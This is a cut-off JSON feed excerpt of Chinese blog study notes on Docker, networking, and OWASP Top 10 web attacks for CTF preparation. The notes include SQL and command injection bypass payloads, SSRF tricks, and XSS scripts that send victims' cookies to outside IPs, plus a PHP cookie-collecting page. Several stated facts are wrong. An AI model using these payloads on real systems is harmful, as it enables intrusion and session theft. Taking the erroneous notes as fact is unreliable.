            "title": "docker命令基础",
            "date_published": "2024-03-04T06:50:45.000Z",
            "content_html": "<p>创建容器：</p>\n<p>docker images 查看有哪些镜像</p>\n<p>docker search nginx 查看对应的镜像信息</p>\n<p>docker pull nginx:1.20.1</p>\n<p>docker run -d –name myNginx -p 80:80 -d nginx（或者这里写ID） 第一个端口是本机端口，第二个端口是目标docker的端口</p>\n<p>docker ps -a 查看所有的容器</p>\n<p>上传文件：</p>\n<p>docker cp /home/temp.txt redis:/data/</p>\n<p>下载文件：</p>\n<p>docker cp redis:/data/temp.txt /home/</p>\n<p>进入docker的bash环境：</p>\n<p>docker exec-it redis /bin/bash</p>\n<p>不进入环境，只是执行命令：</p>\n<p>docker exec-it redis /bin/bash 要执行的脚本或者指令</p>\n<p>docker镜像导出，tar镜像包可以拷贝到其他机器docker环境中加载</p>\n<p>docker save hello -o hello.tar</p>\n<p>docker镜像加载</p>\n<p>docker load -i hello.tar</p>\n<p>使用docker-compose build 自动化编译环境</p>\n<p>使用docker-compose up -d 启动整个环境</p>\n",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2024/03/04/wang-an-xuan-shou-de-ji-suan-ji-ba-gu-ji-chu/",
            "url": "https://alazymechnaic.github.io/2024/03/04/wang-an-xuan-shou-de-ji-suan-ji-ba-gu-ji-chu/",
            "title": "网安选手的计算机八股基础",
            "date_published": "2024-03-04T06:48:04.000Z",
            "content_html": "<h2 id=\"网络协议原理\"><a href=\"#网络协议原理\" class=\"headerlink\" title=\"网络协议原理\"></a>网络协议原理</h2><h3 id=\"网络结构模型\"><a href=\"#网络结构模型\" class=\"headerlink\" title=\"网络结构模型\"></a>网络结构模型</h3><h3 id=\"TCP协议\"><a href=\"#TCP协议\" class=\"headerlink\" title=\"TCP协议\"></a>TCP协议</h3><h4 id=\"TCP链接建立过程\"><a href=\"#TCP链接建立过程\" class=\"headerlink\" title=\"TCP链接建立过程\"></a>TCP链接建立过程</h4><h3 id=\"HTTP协议\"><a href=\"#HTTP协议\" class=\"headerlink\" title=\"HTTP协议\"></a>HTTP协议</h3><h4 id=\"HTTPS\"><a href=\"#HTTPS\" class=\"headerlink\" title=\"HTTPS\"></a>HTTPS</h4><h3 id=\"常见网络协议及端口\"><a href=\"#常见网络协议及端口\" class=\"headerlink\" title=\"常见网络协议及端口\"></a>常见网络协议及端口</h3><p>1.HTTP (Hyper Text Transfer Protocol) 端口号：80</p>\n<p>2.HTTPS (Secure Hyper Text Transfer Protocol) 端口号：443</p>\n<p>3.FTP (File Transfer Protocol) 端口号：21</p>\n<p>4.SMTP (Simple Mail Transfer Protocol) 端口号：25</p>\n<p>5.POP3 (Post Office Protocol version 3) 端口号：110</p>\n<p>6.IMAP (Internet Message Access Protocol) 端口号：143</p>\n<p>7.DNS (Domain Name System) 端口号：53</p>\n<p>8.DHCP (Dynamic Host Configuration Protocol) 端口号：67/68</p>\n<p>9.Telnet (Terminal Emulation) 端口号：23</p>\n<p>10.SSH (Secure Shell) 端口号：22</p>\n<p>11.NTP (Network Time Protocol) 端口号：123</p>\n<p>12.SNMP (Simple Network Management Protocol) 端口号：161/162</p>\n<p>13.RDP (Remote Desktop Protocol) 端口号：3389</p>\n<p>14.SIP (Session Initiation Protocol) 端口号：5060/5061</p>\n<p>15.ICQ (Internet Control Message Protocol) 端口号：7</p>\n<p>16.IRC (Internet Relay Chat) 端口号：194</p>\n<p>17.BitTorrent 端口号：6881-6889</p>\n<h2 id=\"网络安全技术\"><a href=\"#网络安全技术\" class=\"headerlink\" title=\"网络安全技术\"></a>网络安全技术</h2><h3 id=\"防火墙技术\"><a href=\"#防火墙技术\" class=\"headerlink\" title=\"防火墙技术\"></a>防火墙技术</h3><h3 id=\"CDN原理\"><a href=\"#CDN原理\" class=\"headerlink\" title=\"CDN原理\"></a>CDN原理</h3><h2 id=\"网络攻击\"><a href=\"#网络攻击\" class=\"headerlink\" title=\"网络攻击\"></a>网络攻击</h2><h3 id=\"DDOS\"><a href=\"#DDOS\" class=\"headerlink\" title=\"DDOS\"></a>DDOS</h3><h2 id=\"面试题目\"><a href=\"#面试题目\" class=\"headerlink\" title=\"面试题目\"></a>面试题目</h2><h3 id=\"当浏览器输入网址敲下回车后发生了什么？\"><a href=\"#当浏览器输入网址敲下回车后发生了什么？\" class=\"headerlink\" title=\"当浏览器输入网址敲下回车后发生了什么？\"></a>当浏览器输入网址敲下回车后发生了什么？</h3><ul>\n<li>浏览器对URL地址进行补全，并进行请求DNS域名服务器进行解析，获取对应的IP</li>\n<li>与目标服务器三次握手建立TCP连接</li>\n<li>建立HTPPS链接：双发基于证书<ul>\n<li>客户端发出TLS请求，包含一个随机数A</li>\n<li>服务器给出数字证书和随机数B</li>\n<li>客户端取出公钥加密随机数C</li>\n<li>服务器解出随机数C，计算得到本次的会话秘钥，并使用会话秘钥加密</li>\n</ul>\n</li>\n<li>发送HTTP请求，服务器进行响应</li>\n<li>浏览器解析HTML，浏览器渲染布局</li>\n<li>四次挥手关闭TCP连接</li>\n</ul>\n",
            "tags": [
                "network"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2024/03/04/owasp-top10-hui-zong/",
            "url": "https://alazymechnaic.github.io/2024/03/04/owasp-top10-hui-zong/",
            "title": "OWASP top10 汇总",
            "date_published": "2024-03-04T06:45:25.000Z",
            "content_html": "<h1 id=\"CTF-Web-OWASP-Top10\"><a href=\"#CTF-Web-OWASP-Top10\" class=\"headerlink\" title=\"CTF Web OWASP Top10\"></a>CTF Web OWASP Top10</h1><h1 id=\"注入漏洞\"><a href=\"#注入漏洞\" class=\"headerlink\" title=\"注入漏洞\"></a>注入漏洞</h1><ol>\n<li><p>SQL注入</p>\n<ol>\n<li>字符型注入</li>\n</ol>\n<p><strong>1. information_schema.tables where table_schema=database() 2. information_schema.columns where table_name=’查询到的表名’ # 查看列名</strong></p>\n<ol>\n<li><p>数字型注入</p>\n</li>\n<li><p>宽字节注入</p>\n<ol>\n<li>产生原理：在web中对于单引号会进行转译，在前面加上反斜杠进行转译操作，但是0x5C和前面的0xbf会组成一个字符，从而造成后面的0x27逃逸。0x5cbf是一个中文GBK编码里的一个汉字</li>\n<li>一些函数<a href=\"http://www.baidu.com/link?url=9cRbUwRIrAuYAB6IXVQCP3RAy6b7IEVDAtWJ30s_SZ3mrkZvhI9rcB-Jmg0SflArh_S6yOMxBxbzIIjd3IOQ6dVDC5v5tpWhgDGAlrypqIW\">addslashes</a>函数会将特殊字符加个反斜杠转译</li>\n<li>解决方法：同一数据库，web应用，操作系统所使用的数据集。对数据进行正确的转译</li>\n</ol>\n</li>\n<li><p>延时注入</p>\n<ol>\n<li>页面并不会给出任何的回显，利用sleep函数和字符串处理函数进行正误的反馈</li>\n</ol>\n</li>\n<li><p>报错注入</p>\n<ol>\n<li><p>常用函数</p>\n<ol>\n<li><p>XPATH</p>\n</li>\n<li><p>floor</p>\n<ol>\n<li>向下取整函数，当其余count和order by进行连用时会出现报错</li>\n</ol>\n</li>\n<li><p>updatexml</p>\n<ol>\n<li>第二个参数必须是一个有效的XPATH，因此可以成select语句，</li>\n<li></li>\n</ol>\n<p><img src=\"D:/Users/harry/Documents/GitHub/HustCTFer/CTF_Web/CTF_Web_OWASP_top10.assets/image-20221030143612631.png\" alt=\"image-20221030143612631\"></p>\n</li>\n<li><p>extractvalue</p>\n<ol>\n<li>与updatexml的原理类似，都是用于xpath路径错误所导致的</li>\n</ol>\n</li>\n<li><p>geometrycollection</p>\n</li>\n<li><p>multipoint</p>\n</li>\n<li><p>polygon</p>\n</li>\n<li><p>exp</p>\n</li>\n</ol>\n</li>\n</ol>\n</li>\n<li><p>布尔注入</p>\n<ol>\n<li>页面虽然不能返回查询的结果，但是对于输入 布尔值 0 和 1 的反应是不同的，那我们就可以利用这个输入布尔值的注入点来注入我们的条件语句，从而能根据页面的返回情况推测出我们输入的语句是否正确(<strong>输入语句的真假直接影响整条查询语句最后查询的结果的真假</strong>)</li>\n<li><img src=\"D:/Users/harry/Documents/GitHub/HustCTFer/CTF_Web/CTF_Web_OWASP_top10.assets/image-20221030144059058.png\" alt=\"image-20221030144059058\"></li>\n</ol>\n</li>\n</ol>\n</li>\n<li><p>堆叠注入</p>\n<ol>\n<li>原因是网站使用了mysql_multi_query()函数进行SQL的查询，导致一次进行了多次查询</li>\n<li>可以在直接在后面加上分号开始执行另一条语句</li>\n</ol>\n</li>\n<li><p>二次注入</p>\n<ol>\n<li>例如用户注册时对于用的输入内容进行严格的转译，防止mysql执行含有特殊字符及字符串的sql语句，但是当在注册时将内容插入到数据库的内容并不存在转义符，因此可以尝试再次使用例如修改密码等操作，使其取出数据库的payload拼接到新的sql语句中执行</li>\n<li>解决方法: 保证数据流安全，对于外部提交的数据始终保持一个审慎的状态，即便是从数据库中查出的内容也进行严格的过滤</li>\n</ol>\n</li>\n<li><p>绕过方法：</p>\n<ol>\n<li><p>空格的绕过方法</p>\n<ol>\n<li>编码后的TAB符</li>\n<li>圆括号</li>\n<li>闭合注释/**/</li>\n</ol>\n</li>\n<li><p>等于号的绕过</p>\n<ol>\n<li>sth in sth</li>\n<li>like</li>\n</ol>\n</li>\n<li><p>select</p>\n<ol>\n<li><p>使用handler进行绕过</p>\n</li>\n<li><p><img src=\"D:/Users/harry/Documents/GitHub/HustCTFer/CTF_Web/CTF_Web_OWASP_top10.assets/image-20221030144118632.png\" alt=\"image-20221030144118632\"></p>\n</li>\n<li><p>利用show进行代替：show columns from ‘xxx’;</p>\n</li>\n</ol>\n</li>\n<li><p>一般字符串绕过方法：</p>\n<ol>\n<li><p>大小写绕过</p>\n</li>\n<li><p>利用prepare将字符串中的关键词拆开：</p>\n</li>\n<li><p><img src=\"https://github.com/alazymechnaic/HustCTFer/blob/main/CTF%20Web/CTF_Web_OWASP_top10.assets/image-20221030144136360.png\" alt=\"image-20221030144136360\"></p>\n</li>\n<li><p>使用reverse函数将字符串进行绕过，或者使用char函数将字符写作ascii码进行绕过</p>\n</li>\n<li><p>使用CHAR函数，SELECT FROM Users WHERE username = <strong>CHAR</strong>(101, 97, 105, 116)或者char(101)+char(97)+char(105)+char(116)</p>\n</li>\n</ol>\n</li>\n<li><p>替换逗号</p>\n<ol>\n<li>使用join函数</li>\n<li><img src=\"D:/Users/harry/Documents/GitHub/HustCTFer/CTF_Web/CTF_Web_OWASP_top10.assets/image-20221030144147705.png\" alt=\"image-20221030144147705\"></li>\n</ol>\n</li>\n<li><p>大于小于号绕过</p>\n<ol>\n<li>使用greatest函数，将取出的字符和对应的字符进行比较</li>\n<li>用于布尔注入或者延时注入时的二分查找法</li>\n</ol>\n</li>\n<li><p>sleep函数绕过</p>\n<ol>\n<li>使用反复执行md5函数的操作延长执行时间</li>\n<li><img src=\"D:/Users/harry/Documents/GitHub/HustCTFer/CTF_Web/CTF_Web_OWASP_top10.assets/image-20221030144158798.png\" alt=\"image-20221030144158798\"></li>\n</ol>\n</li>\n</ol>\n</li>\n<li><p>mysql的基本操作</p>\n<ol>\n<li>插入一条数据：INSERT INTO tb_courses (course_id,course_name,course_grade,course_info) VALUES(1,’Network’,3,’Computer Network’);</li>\n<li>删除一条数据：DELETE FROM tb_courses WHERE course_id=4;</li>\n<li>修改数据 UPDATE table_name SET field1=new-value1, field2=new-value2 where id=xxx；</li>\n</ol>\n</li>\n<li><p>SQL注入读写文件 1.</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429028.png\" alt=\"image-20221030144208544\"></p>\n<ol>\n<li><p>1’ union select ,1,(Select load_file(‘c:/phpstudy/www/1.txt’)),3%23</p>\n</li>\n<li><p>修改sql的日志位置，但是需要提供绝对路径 1.</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429891.png\" alt=\"image-20221030144218177\"></p>\n</li>\n</ol>\n</li>\n<li><p>SQL注入提权</p>\n<ol>\n<li>mof提权<ol>\n<li>mof文件是windows系统下的一个托管文件，其作用是每隔五秒就会去监控进程创建和死亡，其本身使用的是管理员权限来完成该任务，mysql中上传mof文件到一个可读可写的目录中，而后使用sql语句替换对应的内容，</li>\n<li>Select load_file(“上传文件的路径”) into dumpfile “配置文件所在路径” ，mof文件中存在一些提权vbs脚本，一般是添加管理员账户等行为。</li>\n</ol>\n</li>\n<li>udf提权<ol>\n<li>要求secure-file-priv参数设置为空，设置为null禁止mysql导入和导出</li>\n<li>对目录有写出权限</li>\n<li>编写恶意的udf文件替换udf.dll文件</li>\n</ol>\n</li>\n</ol>\n</li>\n<li><p>SQL注入getshell</p>\n<ol>\n<li>mysql中使用system pwd方式可以执行系统命令，也可以使用cmd_shell</li>\n<li>session包含方式getshell</li>\n<li></li>\n</ol>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429924.png\" alt=\"image-20221030144228649\"></p>\n<ol>\n<li>慢查询日志getshell</li>\n</ol>\n</li>\n</ol>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429941.png\" alt=\"image-20221030144241107\"></p>\n<h3 id=\"防御手段：可以采用预编译的方式进行。\"><a href=\"#防御手段：可以采用预编译的方式进行。\" class=\"headerlink\" title=\"防御手段：可以采用预编译的方式进行。\"></a>防御手段：可以采用预编译的方式进行。</h3><ol>\n<li><p>过滤函数：</p>\n</li>\n<li><p>命令注入</p>\n<ol>\n<li><p>php执行系统命令的函数：</p>\n<ol>\n<li><p>system，eval，assert，call_user_func，shell_exec，passthru，proc_open()</p>\n</li>\n<li><p>读文件的命令more，less，head查看前几行的内容，tac从最后一行开始读内容,od以二进制的方式读取内容，file -f从报错中可以看到具体内容</p>\n</li>\n<li><p>绕过方法：</p>\n<ol>\n<li><p>字符串绕过 ip2long函数更改字符串的类型为long类型，但同样在传入后可以执行</p>\n</li>\n<li><p>使用URL编码进行注入</p>\n</li>\n<li><p>分号拼接，&amp;&amp;符拼接，将前一个内容的输入为空，和后面管道符拼接后继续或者使用||当前一个命令执行不成功时执行后面一个命令</p>\n</li>\n<li><p>命令嵌套 echo “result ${uname -a}”</p>\n</li>\n<li><p>${IFS}用于进行空格的替换，cat&lt;flag.txt用于代替空格，php环境下可以用tab（编码后即%09）</p>\n</li>\n<li><p>关键词绕过</p>\n<ol>\n<li>Windows下可以使用大小写</li>\n<li></li>\n</ol>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429970.png\" alt=\"image-20221030144252391\"></p>\n<ol>\n<li>base64的编码方式：</li>\n<li></li>\n</ol>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429034.png\" alt=\"image-20221030144259834\"></p>\n</li>\n</ol>\n</li>\n<li><p>修复方法</p>\n<ol>\n<li>强过滤：<ol>\n<li>stripslashes() 剔除反斜杠</li>\n<li>addslashes() 给特殊字符增加反斜杠</li>\n<li>mysql_real_escape_string() 转译在mysql中使用到的特殊字符</li>\n</ol>\n</li>\n</ol>\n</li>\n</ol>\n</li>\n</ol>\n</li>\n<li><p>MYSQL 5.0以上与以下注入的区别：</p>\n<ol>\n<li>mysql5.0以上没有information_schema这个表，因此只能暴力跑表名</li>\n<li>5.0以下是单用户操作，5.0以上是多用户操作</li>\n</ol>\n</li>\n<li><p>SQL注入能做什么：万能密码，写入webshell，执行系统指令</p>\n</li>\n<li><p>文件读取函数：file_get_contents(),highlight_file(),fopen(),readfile(),fread(),fgets(),show_source()</p>\n</li>\n</ol>\n<h1 id=\"中间件漏洞\"><a href=\"#中间件漏洞\" class=\"headerlink\" title=\"中间件漏洞\"></a>中间件漏洞</h1><h1 id=\"文件上传漏洞\"><a href=\"#文件上传漏洞\" class=\"headerlink\" title=\"文件上传漏洞\"></a>文件上传漏洞</h1><p>绕过方式：</p>\n<ul>\n<li>前端JS验证：<ul>\n<li>禁用JS</li>\n<li>抓包该文件内容/文件名</li>\n</ul>\n</li>\n<li>MIME验证<ul>\n<li>修改Content-Type中的内容为image/jepg</li>\n</ul>\n</li>\n<li>服务端验证后缀：<ul>\n<li>php更改为畸形后缀，例如phtml，php，php3等内容</li>\n<li>当目标主机是windows时可以尝试采用大小写绕过的方式</li>\n<li>::$DATA备用数据流的绕过方式</li>\n<li>上传.htaccess文件更改当前文件夹下的解析规则，将jpg文件按照php文件的格式进行解析</li>\n</ul>\n</li>\n<li>%00截断；（php5.3以下才可以使用，且要求上传的文件名就是最终存储的文件名，或者最终存储的文件名是可控的，问题出现在存储时，上传时需要手动解码以下00）</li>\n<li>配合文件包含漏洞使用，构造图片马，copy a.jpg + b.php 1.jpg</li>\n<li>中间件的解析漏洞（IIS6.0的未知后缀会一直向前解析；条件竞争</li>\n</ul>\n<p>防御方法：白名单检查；随机化存储路径；上传的目录限制执行权限；网站服务器和文件服务器二者分离；限制文件的大小</p>\n<h1 id=\"XSS漏洞\"><a href=\"#XSS漏洞\" class=\"headerlink\" title=\"XSS漏洞\"></a>XSS漏洞</h1><h2 id=\"反射型XSS\"><a href=\"#反射型XSS\" class=\"headerlink\" title=\"反射型XSS\"></a>反射型XSS</h2><hr>\n<p>反射型XSS，当传入的用户信息被当做JS代码执行。反射型XSS仅在GET方法时，引诱用户点击链接，是有危害性的。</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-property\">cookie</span>) # 弹出用户cookie<br></code></pre></td></tr></tbody></table></figure>\n\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\"># 在服务器上搭建接收cookie的页面</span><br><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-variable\">$cookie</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'cookie'</span>];<br><span class=\"hljs-variable\">$ip</span> = <span class=\"hljs-title function_ invoke__\">getenv</span> (<span class=\"hljs-string\">'REMOTE_ADDR'</span>);<br><span class=\"hljs-variable\">$time</span> = <span class=\"hljs-title function_ invoke__\">date</span>(<span class=\"hljs-string\">'Y-m-d g:i:s'</span>);<br><span class=\"hljs-variable\">$fp</span> = <span class=\"hljs-title function_ invoke__\">fopen</span>(<span class=\"hljs-string\">\"cookie.txt\"</span>,<span class=\"hljs-string\">\"a\"</span>);<br><span class=\"hljs-title function_ invoke__\">fwrite</span>(<span class=\"hljs-variable\">$fp</span>,<span class=\"hljs-string\">\"IP: \"</span>.<span class=\"hljs-variable\">$ip</span>.<span class=\"hljs-string\">\"Date: \"</span>.<span class=\"hljs-variable\">$time</span>.<span class=\"hljs-string\">\" Cookie:\"</span>.<span class=\"hljs-variable\">$cookie</span>.<span class=\"hljs-string\">\"\\n\"</span>);<br><span class=\"hljs-title function_ invoke__\">fclose</span>(<span class=\"hljs-variable\">$fp</span>);<br><span class=\"hljs-meta\">?&gt;</span>   <br></code></pre></td></tr></tbody></table></figure>\n\n<p>构造JS代码</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\">&lt;script&gt;<span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">write</span>(<span class=\"hljs-string\">'&lt;img src=\"47.100.33.58/getcookie.php?cookie='</span>+<span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-property\">cookie</span>+<span class=\"hljs-string\">'\"width=0 height=0/&gt;'</span>)<br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h2 id=\"储存型XSS\"><a href=\"#储存型XSS\" class=\"headerlink\" title=\"储存型XSS\"></a>储存型XSS</h2><hr>\n<p>盗取cookie方法</p>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\">#前端代码</span><br>&lt;script&gt;window.<span class=\"hljs-title function_ invoke__\">open</span>(<span class=\"hljs-string\">'http://10.65.20.196:8080/cookie.asp?msg='</span>+document.cookie)&lt;/script&gt;<br><br><span class=\"hljs-comment\"># 服务端</span><br> <span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'cook'</span>])){<br>    <span class=\"hljs-variable\">$msg</span>=<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'cook'</span>];<br>    <span class=\"hljs-variable\">$time</span>=<span class=\"hljs-string\">' | '</span>.<span class=\"hljs-title function_ invoke__\">getdate</span>()[<span class=\"hljs-string\">'year'</span>].<span class=\"hljs-string\">'/'</span>.<span class=\"hljs-title function_ invoke__\">getdate</span>()[<span class=\"hljs-string\">'mon'</span>].<span class=\"hljs-string\">'/'</span>.<span class=\"hljs-title function_ invoke__\">getdate</span>()[<span class=\"hljs-string\">'mday'</span>].<span class=\"hljs-string\">'/'</span>.<span class=\"hljs-title function_ invoke__\">getdate</span>()[<span class=\"hljs-string\">'hours'</span>].<span class=\"hljs-string\">'/'</span>.<span class=\"hljs-title function_ invoke__\">getdate</span>()[<span class=\"hljs-string\">'minutes'</span>].<span class=\"hljs-string\">'/'</span>.<span class=\"hljs-title function_ invoke__\">getdate</span>()[<span class=\"hljs-string\">'seconds'</span>].<span class=\"hljs-string\">' Cookie: '</span>;<br>    <span class=\"hljs-variable\">$ip</span> = <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">\"REMOTE_ADDR\"</span>].<span class=\"hljs-title function_ invoke__\">md5</span>((<span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">\"REMOTE_ADDR\"</span>].<span class=\"hljs-string\">'salt'</span>));<br>    <span class=\"hljs-title function_ invoke__\">file_put_contents</span>(<span class=\"hljs-variable\">$ip</span>.<span class=\"hljs-string\">'.txt'</span>,PHP_EOL.<span class=\"hljs-variable\">$time</span>.<span class=\"hljs-variable\">$msg</span>, FILE_APPEND);<br>}<span class=\"hljs-keyword\">else</span>{<br>    <span class=\"hljs-variable\">$msg</span>=<span class=\"hljs-number\">0</span>;<br>}<br><br><br></code></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"DOM型XSS\"><a href=\"#DOM型XSS\" class=\"headerlink\" title=\"DOM型XSS\"></a>DOM型XSS</h2><ol>\n<li><p>DOM即是Document object model</p>\n</li>\n<li><p>DOM型是通过修改或读取document的属性和方法进行攻击，既有反射性也有存储型，而且没有与服务器进行交互</p>\n</li>\n<li><p>DOM型XSS的程序只有HTML代码，并不存在服务器代码</p>\n</li>\n<li><p>DOM型XSS的输出是由DOM操作产生的，</p>\n</li>\n<li><p>危害：</p>\n<ol>\n<li>盗取cookie，配合CSRF</li>\n<li>劫持会话</li>\n<li>网络钓鱼</li>\n<li>骚套路打后台告警</li>\n<li>控制受害主机向其他网站发起攻击</li>\n<li>传播跨站脚本蠕虫</li>\n</ol>\n</li>\n<li><p>防御方法：</p>\n<ol>\n<li>htmlspecialchars 和 htmlentities函数进行过滤</li>\n<li>设置Http only机制可以防止cookie被盗取</li>\n<li>验证Refer字段</li>\n</ol>\n</li>\n</ol>\n<h1 id=\"CSRF原理\"><a href=\"#CSRF原理\" class=\"headerlink\" title=\"CSRF原理\"></a>CSRF原理</h1><ol>\n<li>跨站请求伪造：原理是利用网站对于用户网页浏览器的信任，挟持用户当前已经登陆的web身份，去执行非用户本意的操作</li>\n<li>流程：生成跨站请求链接，诱导用户点击链接，劫持用户的cookie</li>\n<li>可以是GET型也可以是POST型，POST型的表单存存放在黑客网站的页面中，当用户访问黑客的页面时会造成利用用户的浏览器身份向服务器发送请求</li>\n<li>防御：使用http的refer字段进行验证，添加CSRF token验证,在每次请求时服务器都会给用户不同的token</li>\n</ol>\n<h1 id=\"SSRF原理\"><a href=\"#SSRF原理\" class=\"headerlink\" title=\"SSRF原理\"></a>SSRF原理</h1><ol>\n<li>服务器请求伪造，指的是在攻击者未能取得服务器的权限时以服务器的身份发送一条构造好的请求给服务器所在的内网主机发送消息，外部网络一般无法访问内部网络，要依靠该漏洞作为跳板请求内网主机。主要原因是从其他服务器应用获取数据的功能但是没有对目标地址做过滤和探测。例如分享时会加载一些页面，就是对外部的请求，例如给个链接进行翻译，给定一个资源链接开始下载资源</li>\n<li>产生SSRF的漏洞的函数：<ol>\n<li>file_get_contents（）支持php://input</li>\n<li>sockopen()</li>\n<li>curl_exec()</li>\n</ol>\n</li>\n<li>可以使用的协议有哪些：<ol>\n<li>http协议，gopher(gopher协议不能进行URL编码），zip，file协议</li>\n</ol>\n</li>\n<li>危害：</li>\n</ol>\n<p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>\n<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>\n<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>\n<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>\n<p>5.利用file协议读取本地文件等。.</p>\n<p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p>\n<ol>\n<li>防御方法：<ol>\n<li>过滤返回信息，确保用户请求的返回内容符合标准</li>\n<li>统一的错误信息，避免用户根据错误信息来判断端口的状态</li>\n<li>使用DNS缓存或者HOST的白名单的方式进行防御</li>\n<li>限制协议为http或者https.</li>\n</ol>\n</li>\n<li>绕过方法：<ol>\n<li>短网址</li>\n<li>将IP地址改为十六进制表示</li>\n<li>特殊域名可以利用[::]来绕过localhost [<a href=\"http://169.254.169.254>>http://[::169.254.169.254](http://169.254.169.254%3E%3Ehttp/%5b::169.254.169.254)]\">http://169.254.169.254&gt;&gt;http://[::169.254.169.254](http://169.254.169.254%3E%3Ehttp/%5b::169.254.169.254)]</a></li>\n</ol>\n</li>\n</ol>\n<h1 id=\"XXE原理\"><a href=\"#XXE原理\" class=\"headerlink\" title=\"XXE原理\"></a>XXE原理</h1><ol>\n<li>XXE漏洞即XML外部实体注入，当xml引用外部实体并进行解析时会产生的漏洞，xml解析器会获取其中的外部资源并存储到内部实体中，攻击者可以引用外部资源并存储到内部实体中，攻击者可以引用外部实体对目标进行文件读取，命令执行，DDOS，内网探测等操作</li>\n<li>解决方法：<ol>\n<li>在php的libxml_disable_entity_loader(true) 不允许加载外部实体</li>\n<li>过滤用户提交的xml数据，比如entity，system等</li>\n<li>配置XML处理器禁用DTD，禁止外部实体解析，通过黑名单过滤用户提交的数据</li>\n</ol>\n</li>\n</ol>\n<h1 id=\"反序列化漏洞\"><a href=\"#反序列化漏洞\" class=\"headerlink\" title=\"反序列化漏洞\"></a>反序列化漏洞</h1><h2 id=\"前导知识\"><a href=\"#前导知识\" class=\"headerlink\" title=\"前导知识\"></a>前导知识</h2><hr>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\">// 两个重要的函数</span><br><span class=\"hljs-title function_ invoke__\">serialize</span>()<br><span class=\"hljs-title function_ invoke__\">unserialize</span>()<br><span class=\"hljs-comment\">//第一个是将传入的字符串转换为对象，第二个则是将对象转换为字符串</span><br><span class=\"hljs-comment\">//序列化后的字符串</span><br>O:<span class=\"hljs-number\">9</span>:<span class=\"hljs-string\">\"DemoClass\"</span>:<span class=\"hljs-number\">3</span>:{s:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"name\"</span>;s:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"john\"</span>;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">\"sex\"</span>;s:<span class=\"hljs-number\">5</span>:<span class=\"hljs-string\">\"Women\"</span>;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">\"age\"</span>;s:<span class=\"hljs-number\">2</span>:<span class=\"hljs-string\">\"18\"</span>;}<br><span class=\"hljs-comment\">// 其中O代表是个对象，后面的数代表对象类别的名字长度，然后是对象名称，最后是对象中的元素数量</span><br><span class=\"hljs-comment\">//s代表后面的对象元素是字符串，若为数字则是i</span><br>O:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"Name\"</span>:<span class=\"hljs-number\">3</span>:{s:<span class=\"hljs-number\">14</span>:<span class=\"hljs-string\">\"\\0Name\\0username\"</span>;s:<span class=\"hljs-number\">5</span>:<span class=\"hljs-string\">\"admin\"</span>;s:<span class=\"hljs-number\">14</span>:<span 